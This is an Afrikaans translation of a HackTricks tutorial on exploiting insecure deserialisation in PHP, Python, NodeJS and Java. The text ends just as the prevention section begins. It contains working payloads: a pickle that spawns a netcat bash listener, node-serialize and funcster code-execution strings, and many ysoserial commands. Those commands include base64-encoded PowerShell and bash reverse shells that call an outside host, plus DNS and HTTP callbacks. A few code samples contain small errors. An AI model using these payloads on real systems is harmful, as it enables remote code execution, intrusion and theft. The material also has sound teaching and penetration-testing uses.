# Deserialisasie

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

**Serialisasie** word verstaan as die metode om 'n voorwerp in 'n formaat om te skakel wat bewaar kan word, met die doel om die voorwerp te stoor of dit as deel van 'n kommunikasieproses oor te dra. Hierdie tegniek word gewoonlik gebruik om te verseker dat die voorwerp op 'n latere tydstip herskep kan word, met behoud van sy struktuur en toestand.

**Deserialisasie**, daarenteen, is die proses wat teen serialisasie teenwerk. Dit behels die neem van data wat in 'n spesifieke formaat gestruktureer is en dit terug te bou in 'n voorwerp.

Deserialisasie kan gevaarlik wees omdat dit potensieel **aanvallers toelaat om die geserialiseerde data te manipuleer om skadelike kode uit te voer** of onverwagte gedrag in die aansoek tydens die voorwerpherkonstruksieproses te veroorsaak.

## PHP

In PHP word spesifieke toor-metodes gebruik tydens die serialisasie- en deserialisasieprosesse:

* `__sleep`: Aangeroep wanneer 'n voorwerp geserialiseer word. Hierdie metode moet 'n lys van die name van alle eienskappe van die voorwerp wat geserialiseer moet word, teruggee. Dit word gewoonlik gebruik om hangende data te bevestig of soortgelyke skoonmaaktake uit te voer.
* `__wakeup`: Geroep wanneer 'n voorwerp gedeserialiseer word. Dit word gebruik om enige databasisverbindings wat dalk verloor gegaan het tydens serialisasie te herstel en ander herinisialiseringstake uit te voer.
* `__unserialize`: Hierdie metode word geroep in plaas van `__wakeup` (indien dit bestaan) wanneer 'n voorwerp gedeserialiseer word. Dit bied meer beheer oor die deserialisasieproses in vergelyking met `__wakeup`.
* `__destruct`: Hierdie metode word geroep wanneer 'n voorwerp op die punt staan om vernietig te word of wanneer die skripsie eindig. Dit word tipies gebruik vir skoonmaaktake, soos die sluit van l√™erhandvatsels of databasisverbindings.
* `__toString`: Hierdie metode laat toe dat 'n voorwerp as 'n string behandel word. Dit kan gebruik word vir die lees van 'n l√™er of ander take gebaseer op die funksie-oproepe binne dit, wat effektief 'n teksuele voorstelling van die voorwerp bied.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Indien jy na die resultate kyk, kan jy sien dat die funksies **`__wakeup`** en **`__destruct`** aangeroep word wanneer die objek gedeserializeer word. Let daarop dat in verskeie tutoriale sal jy vind dat die **`__toString`** funksie aangeroep word wanneer 'n attribuut probeer gedruk word, maar blykbaar gebeur dit **nie meer nie**.

{% hint style="warning" %}
Die metode **`__unserialize(array $data)`** word **in plaas van `__wakeup()`** aangeroep as dit ge√Ømplementeer is in die klas. Dit stel jou in staat om die objek te unserialize deur die geserializeerde data as 'n array te voorsien. Jy kan hierdie metode gebruik om eienskappe te unserialize en enige nodige take uit te voer tydens deserialisering.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Jy kan 'n verduidelikte **PHP-voorbeeld hier lees**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), hier [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) of hier [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Jy kan die PHP autoload-funksionaliteit misbruik om arbitr√™re php-l√™ers en meer te laai:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializing Referenced Values

As jy om een of ander rede 'n waarde wil serializeer as 'n **verwysing na 'n ander serializeerde waarde** kan jy:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial vir PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) kan jou help om payloads te genereer om PHP-deserialisasies te misbruik.\
Merk op dat in verskeie gevalle jy **nie 'n manier sal vind om 'n deserialisasie in die bronkode** van die aansoek te misbruik nie, maar jy mag dalk die kode van eksterne PHP-uitbreidings **misbruik.**\
So, as jy kan, kyk na die `phpinfo()` van die bediener en **soek op die internet** (selfs op die **toestelle** van **PHPGGC**) vir moontlike toestelle wat jy kan misbruik.

### phar:// metadata deserialisasie

As jy 'n LFI gevind het wat net die l√™er lees en nie die php-kode daarin uitvoer nie, byvoorbeeld deur funksies soos _**file\_get\_contents(), fopen(), file() of file\_exists(), md5\_file(), filemtime() of filesize()**_**.** Jy kan probeer om 'n **deserialisasie** te misbruik wat plaasvind wanneer jy 'n **l√™er** lees deur die **phar**-protokol te gebruik.\
Vir meer inligting lees die volgende pos:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Wanneer die voorwerp ontgepekel word, sal die funksie _\_\_reduce\_\__ uitgevoer word.\
Wanneer dit uitgebuit word, kan die bediener 'n fout terugstuur.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Vir meer inligting oor ontsnapping uit **pickle-gevangenisse** kyk:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Die volgende bladsy bied die tegniek om **'n onveilige deserialisasie in yaml-python-biblioteke te misbruik** en eindig met 'n instrument wat gebruik kan word om RCE-deserialisasie-lading te genereer vir **Pickle, PyYAML, jsonpickle en ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Klasbesoedeling (Python Prototipe Besoedeling)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Funksies

JS het nie "sielkundige" funksies soos PHP of Python wat uitgevoer gaan word net vir die skep van 'n objek nie. Maar dit het sekere **funksies** wat **gereeld gebruik word selfs sonder om hulle direk te roep** soos **`toString`**, **`valueOf`**, **`toJSON`**.\
As jy 'n deserialisasie misbruik kan jy hierdie funksies **kompromitteer om ander kode uit te voer** (moontlik prototipe-besoedeling misbruik) en jy kan arbitr√™re kode uitvoer wanneer hulle geroep word.

'n Ander **"sielkundige" manier om 'n funksie te roep** sonder om dit direk te roep is deur **'n objek te kompromitteer wat deur 'n asynchrone funksie teruggegee word** (belofte). Want, as jy daardie **terugkeerobjek** omskep in 'n ander **belofte** met 'n **eienskap** genaamd **"then" van die tipe funksie**, sal dit uitgevoer word net omdat dit deur 'n ander belofte teruggegee word. _Volg_ [_**hierdie skakel**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _vir meer inligting._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` en `prototype` besoedeling

As jy meer wil leer oor hierdie tegniek **kyk na die volgende handleiding**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Hierdie biblioteek maak dit moontlik om funksies te serialiseer. Voorbeeld:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
Die **geserialiseerde voorwerp** sal lyk soos:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Jy kan sien in die voorbeeld dat wanneer 'n funksie geserializeer word, die `_$$ND_FUNC$$_` vlag aan die geserializeerde objek geheg word.

Binne die l√™er `node-serialize/lib/serialize.js` kan jy dieselfde vlag vind en hoe die kode dit gebruik.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Soos jy kan sien in die laaste stuk kode, **as die vlag gevind word** word `eval` gebruik om die funksie te deserialiseer, so basies **word gebruikersinvoer binne die `eval`-funksie gebruik**.

Nietemin, **net die serializeer** van 'n funksie **sal dit nie uitvoer** nie, aangesien dit nodig sou wees dat 'n deel van die kode **`y.rce` aanroep** in ons voorbeeld en dit is hoogs **onwaarskynlik**.\
Hoe dan ook, jy kan net **die geserializeerde objek wysig** **deur 'n paar hakies by te voeg** om die geserializeerde funksie outomaties uit te voer wanneer die objek gedeserializeer word.\
In die volgende stuk kode **let op die laaste hakies** en hoe die `unserialize`-funksie die kode outomaties sal uitvoer:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Soos voorheen aangedui, sal hierdie biblioteek die kode kry na `_$$ND_FUNC$$_` en dit **uitvoer** deur `eval` te gebruik. Daarom, om kode outomaties uit te voer, kan jy die deel wat die funksie skep verwyder en die laaste hakies en **net 'n JS-eenlynige kode uitvoer** soos in die volgende voorbeeld:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Jy kan [**hier vind**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **verdere inligting** oor hoe om hierdie kwesbaarheid te benut.

### [funcster](https://www.npmjs.com/package/funcster)

'n Noemenswaardige aspek van **funcster** is die ontoeganklikheid van **standaard ingeboude voorwerpe**; hulle val buite die toeganklike omvang. Hierdie beperking voorkom die uitvoering van kode wat probeer om metodes op ingeboude voorwerpe aan te roep, wat lei tot uitsonderings soos `"ReferenceError: console is not defined"` wanneer opdragte soos `console.log()` of `require(something)` gebruik word.

Ten spyte van hierdie beperking is herstel van volle toegang tot die globale konteks, insluitend alle standaard ingeboude voorwerpe, moontlik deur 'n spesifieke benadering. Deur die globale konteks direk te benut, kan 'n persoon hierdie beperking omseil. Byvoorbeeld, toegang kan herstel word deur die volgende snipper te gebruik:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Vir** [**meer inligting lees hierdie bron**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Die **serialize-javascript** pakket is uitsluitlik ontwerp vir serializeerdoeleindes, sonder enige ingeboude deserialisasievermo√´ns. Gebruikers is verantwoordelik vir die implementering van hul eie metode vir deserialisasie. 'n Direkte gebruik van `eval` word voorgestel deur die amptelike voorbeeld vir die deserialisering van geserializeerde data:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Indien hierdie funksie gebruik word om voorwerpe te deserialiseer, kan jy dit **maklik uitbuit**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Vir** [**meer inligting lees hierdie bron**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo-biblioteek

Op die volgende bladsye kan jy inligting vind oor hoe om hierdie biblioteek te misbruik om willekeurige bevele uit te voer:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

In Java, **deserialisasie terugroepings word uitgevoer gedurende die deserialisasieproses**. Hierdie uitvoering kan uitgebuit word deur aanvallers wat bose payloads skep wat hierdie terugroepings aktiveer, wat kan lei tot die potensi√´le uitvoering van skadelike aksies.

### Vingerafdrukke

#### Witkas

Om potensi√´le serialisasie kwesbaarhede in die kodebasis te identifiseer, soek vir:

* Klas wat die `Serializable`-koppelvlak implementeer.
* Gebruik van `java.io.ObjectInputStream`, `readObject`, `readUnshare` funksies.

Betaal ekstra aandag aan:

* `XMLDecoder` wat met parameters gedefinieer deur eksterne gebruikers gebruik word.
* `XStream` se `fromXML` metode, veral as die XStream weergawe minder as of gelyk aan 1.46 is, aangesien dit vatbaar is vir serialisasieprobleme.
* `ObjectInputStream` gekoppel met die `readObject` metode.
* Implementering van metodes soos `readObject`, `readObjectNodData`, `readResolve`, of `readExternal`.
* `ObjectInputStream.readUnshared`.
* Algemene gebruik van `Serializable`.

#### Swartkas

Vir swartkas toetsing, soek na spesifieke **handtekeninge of "Magic Bytes"** wat Java geserialiseerde voorwerpe aandui (afkomstig van `ObjectInputStream`):

* Heksadesimale patroon: `AC ED 00 05`.
* Base64-patroon: `rO0`.
* HTTP-terugvoer koppele met `Content-type` ingestel op `application/x-java-serialized-object`.
* Heksadesimale patroon wat vooraf kompressie aandui: `1F 8B 08 00`.
* Base64-patroon wat vooraf kompressie aandui: `H4sIA`.
* Web l√™ers met die `.faces`-uitbreiding en die `faces.ViewState`-parameter. Die ontdekking van hierdie patrone in 'n webtoepassing behoort 'n ondersoek aan te spoor soos in die [berig oor Java JSF ViewState Deserialisasie](java-jsf-viewstate-.faces-deserialisasie.md) beskryf.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Kontroleer of dit kwesbaar is

As jy wil **leer oor hoe 'n Java Gedeserializeerde aanval werk** moet jy kyk na [**Basiese Java Deserialisering**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialisering**](java-dns-deserialization-and-gadgetprobe.md), en [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### Witboks-toets

Jy kan nagaan of daar enige ge√Ønstalleerde toepassings met bekende kwesbaarhede is.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Jy kan probeer om **alle biblioteke** wat bekend is om kwesbaar te wees te **ondersoek** en wat 'n uitbuiting kan bied vir [**Ysoserial**](https://github.com/frohoff/ysoserial). Of jy kan die biblioteke nakyk wat aangedui word op [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Jy kan ook [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) gebruik om te soek na moontlike gadget-reekse wat uitgebuit kan word.\
Wanneer jy **gadgetinspector** hardloop (nadat dit gebou is), moenie bekommerd wees oor die tonne waarskuwings/foute wat dit deurgaan nie en laat dit voltooi. Dit sal al die bevindinge skryf onder _gadgetinspector/gadget-results/gadget-chains-jaar-maand-dag-uur-min.txt_. Let asseblief daarop dat **gadgetinspector nie 'n uitbuiting sal skep nie en dit moontlik vals positiewe kan aandui**.

#### Swart Blok Toets

Deur die Burp-uitbreiding [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) te gebruik, kan jy **identifiseer watter biblioteke beskikbaar is** (en selfs die weergawes). Met hierdie inligting kan dit **makliker wees om 'n lading te kies** om die kwesbaarheid uit te buit.\
[**Lees hierdie om meer te leer oor GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe fokus op **`ObjectInputStream` deserialisasies**.

Deur die Burp-uitbreiding [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) te gebruik, kan jy **kwesbare biblioteke identifiseer** wat uitgebuit kan word met ysoserial en hulle **uitbuit**.\
[**Lees hierdie om meer te leer oor Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner fokus op **`ObjectInputStream`** deserialisasies.

Jy kan ook [**Freddy**](https://github.com/nccgroup/freddy) gebruik om **deserialisasie** kwesbaarhede in **Burp** op te spoor. Hierdie invoegtoepassing sal **nie net `ObjectInputStream`** verwante kwesbaarhede opspoor nie, maar ook kwesbaarhede vanaf **Json** en **Yml** deserialisasie biblioteke. In aktiewe modus sal dit probeer om dit te bevestig deur slaap- of DNS-ladings te gebruik.\
[**Meer inligting oor Freddy kan hier gevind word.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialisasie Toets**

Dit gaan nie net daaroor om te kyk of enige kwesbare biblioteek deur die bediener gebruik word nie. Soms kan jy in staat wees om **die data binne die geserialiseerde voorwerp te verander en sommige kontroles te omseil** (miskien gee dit jou administratiewe regte binne 'n webtoepassing).\
As jy 'n Java geserialiseerde voorwerp vind wat na 'n webtoepassing gestuur word, **kan jy** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **gebruik om die geserialiseerde voorwerp wat gestuur word in 'n meer menslik leesbare formaat af te druk**. Om te weet watter data jy stuur, sal dit makliker wees om dit te wysig en sommige kontroles te omseil.

### **Uitbuiting**

#### **ysoserial**

Die hoofinstrument om Java deserialisasies uit te buit is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**laai hier af**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Jy kan ook oorweeg om [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) te gebruik wat jou in staat sal stel om komplekse bevele te gebruik (met pype byvoorbeeld).\
Let daarop dat hierdie instrument **gefokus** is op die uitbuiting van **`ObjectInputStream`**.\
Ek sou **begin deur die "URLDNS"** lading **te gebruik voordat 'n RCE** lading om te toets of die inspuiting moontlik is. Hoe dan ook, let daarop dat die "URLDNS" lading dalk nie werk nie, maar 'n ander RCE lading wel.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Wanneer jy 'n lading vir **java.lang.Runtime.exec()** skep, kan jy **nie spesiale karakters** soos ">" of "|" gebruik om die uitset van 'n uitvoering te herlei, "$()" om bevele uit te voer of selfs **argumente** aan 'n bevel oor te dra wat deur **spasies** geskei is (jy kan `echo -n "hello world"` doen, maar jy kan nie `python2 -c 'print "Hello world"'` doen nie). Om die lading korrek te kodeer, kan jy [hierdie webwerf](http://www.jackson-t.ca/runtime-exec-payloads.html) gebruik.

Voel vry om die volgende skripsie te gebruik om **alle moontlike kode-uitvoering** ladinge vir Windows en Linux te skep en dit dan op die kwesbare webbladsy te toets:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Jy kan **gebruik maak van** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **sames met ysoserial om meer aanvalle te skep**. Meer inligting oor hierdie instrument in die **aantekeninge van die aanbieding** waar die instrument aangebied is: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)kan gebruik word om lading te genereer om verskillende **Json** en **Yml** serialisasie biblioteke in Java te benut.\
Om die projek saam te stel moes ek hierdie **afhanklikhede** by `pom.xml` **toevoeg**:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Installeer maven**, en **kompileer** die projek:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Lees meer oor hierdie Java JSON-biblioteek: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratoriums

* As jy wil toets of ysoserial-ladingstukke kan hardloop, kan jy **hierdie webtoepassing hardloop**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Waarom

Java gebruik baie serialisasie vir verskeie doeleindes soos:

* **HTTP-versoeke**: Serialisasie word wyd gebruik in die bestuur van parameters, ViewState, koekies, ens.
* **RMI (Remote Method Invocation)**: Die Java RMI-protokol, wat heeltemal op serialisasie steun, is 'n hoeksteen vir afgele√´ kommunikasie in Java-toepassings.
* **RMI oor HTTP**: Hierdie metode word algemeen deur Java-gebaseerde dik klient-webtoepassings gebruik, wat serialisasie vir alle objekkommunikasies benut.
* **JMX (Java Management Extensions)**: JMX benut serialisasie vir die oordra van objekte oor die netwerk.
* **Aangepaste Protokolle**: In Java behels die standaard praktyk die oordrag van rou Java-objekte, wat in opkomende uitbuitingsvoorbeelde gedemonstreer sal word.

### Voorkoming

#### Verganklike objekte

